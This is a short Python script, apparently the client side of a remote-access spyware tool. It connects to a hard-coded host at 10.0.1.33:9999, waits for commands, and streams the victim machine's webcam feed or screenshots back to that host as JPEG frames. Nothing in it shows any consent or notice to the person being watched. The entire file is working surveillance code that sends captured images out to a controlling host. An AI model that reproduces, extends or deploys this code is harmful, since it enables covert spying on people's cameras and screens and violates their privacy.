import socket
import cv2
import pyautogui
import numpy as np

def webcam_stream(client_socket):
    cap = cv2.VideoCapture(0)
    while True:
        ret, frame = cap.read()
        if not ret:
            break
        _, buffer = cv2.imencode('.jpg', frame)
        client_socket.sendall(buffer.tobytes())

def screen_stream(client_socket):
    while True:
        screen = pyautogui.screenshot()
        frame = np.array(screen)
        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        _, buffer = cv2.imencode('.jpg', frame)
        client_socket.sendall(buffer.tobytes())

def main():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect(('10.0.1.33', 9999))

    while True:
        command = client_socket.recv(1024).decode('utf-8')
        if command == "webcam_stream":
            webcam_stream(client_socket)
        elif command == "screen_stream":
            screen_stream(client_socket)

if __name__ == "__main__":
    main()
